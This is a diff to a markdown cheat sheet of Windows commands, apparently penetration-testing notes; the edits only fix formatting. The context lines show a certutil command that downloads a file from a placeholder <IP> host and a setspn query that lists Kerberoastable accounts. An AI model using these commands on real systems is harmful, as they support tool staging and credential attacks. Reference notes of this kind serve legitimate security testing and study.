@@ -145,10 +145,11 @@
 	- `type nul >>file & copy file +,,`
 - **Download file**
 	- `certutil.exe -urlcache -f http://<IP>/<file> <output>`
-- **Powershell command from CMD**: `powershell.exe "<command>"`
+- **Powershell command from CMD**
+	- `powershell.exe "<command>"`
 - **Kerberoastable users**
 	- `setspn.exe -Q */*`
-- **Register**:
+- **Register**
 	- **Key of a register (ex.)**
 		- `reg query HKLM\SYSTEM\CurrentControlSet\Services`
 	- **Property of a registry key**
@@ -193,7 +194,7 @@
 $computername=(Get-ADDomainController).Name
 Get-ADComputer $computername -Properties * | select Description
 ```
-- **Am I on a Domain Controller?**:
+- **Am I on a Domain Controller?**
 ```powershell
 # get IPv4 Address
 ipconfig
